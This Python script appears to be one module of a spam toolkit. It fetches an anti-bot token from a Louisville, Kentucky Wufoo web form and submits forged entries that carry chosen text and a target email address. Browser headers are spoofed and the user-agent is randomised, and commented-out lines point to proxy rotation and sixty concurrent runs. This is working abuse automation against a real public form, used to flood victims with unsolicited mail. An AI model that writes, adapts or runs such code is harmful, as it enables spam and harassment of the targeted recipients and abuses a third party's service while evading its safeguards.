import re
from os.path import basename

import requests
from faker import Faker

import module
from module import Spam


def get(session: requests.Session):
    headers = {
        'authority': 'louisvilleky.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    response = session.get(
        'https://louisvilleky.wufoo.com/forms/z1ndl2or1b0rr56/',
        headers=headers
    )
    return response


def post(session: requests.Session, id_stamp, text, target):
    headers = {
        'authority': 'louisvilleky.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarycDMvdCoD937nlMq9',
        'origin': 'https://louisvilleky.wufoo.com',
        'referer': 'https://louisvilleky.wufoo.com/forms/z1ndl2or1b0rr56/',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': Faker().chrome(),
    }

    data = '------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field3"\r\n\r\ntest\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field4"\r\n\r\ntest\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field5"\r\n\r\ntest\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field6"\r\n\r\ntest\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field7"\r\n\r\ntest\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field8"\r\n\r\ntest\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field9"\r\n\r\ntest\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field10"\r\n\r\nUnited States\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field12"\r\n\r\n123\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field12-1"\r\n\r\n132\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field12-2"\r\n\r\n1323\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field11"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field14"\r\n\r\ntest\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="Field16"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="currentPage"\r\n\r\n98g6RslOwuslashDKGGdcm7wcF5rJK24wwuslashPwl02wwuslashy59uvAKE=\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="saveForm"\r\n\r\nSubmit\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="comment"\r\n\r\n\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="idstamp"\r\n\r\nidstamp_field\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="encryptedPassword"\r\n\r\n\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="stats"\r\n\r\n{"errors":0,"startTime":7405,"endTime":136384,"referer":"https://louisvilleky.wufoo.com/forms/z1ndl2or1b0rr56/"}\r\n------WebKitFormBoundarycDMvdCoD937nlMq9\r\nContent-Disposition: form-data; name="clickOrEnter"\r\n\r\nclick\r\n------WebKitFormBoundarycDMvdCoD937nlMq9--\r\n'

    data = data.replace('idstamp_field', id_stamp).replace('test', text).replace('wezxasqw@gmail.com', target)

    response = session.post(
        headers['referer'],
        headers=headers,
        data=data.encode(),
    )
    return response


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        s = requests.Session()
        # s.proxies = self.get_proxies()
        get_resp = get(s)
        pattern = re.compile('(?<=name="idstamp" value=").*(?=" >)')
        idstamp = pattern.findall(get_resp.text)
        if not idstamp:
            return
        text = self.get_text()
        post_resp = post(s, idstamp[0], text, target)
        print(post_resp.text)
        return post_resp


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'Your comments have been successfully submitted!')
    res = spam.send_post(f'{module.generate_text(12)}@1secmail.com')
    # if res:
    #     spam.run_concurrently(60)


if __name__ == '__main__':
    main()
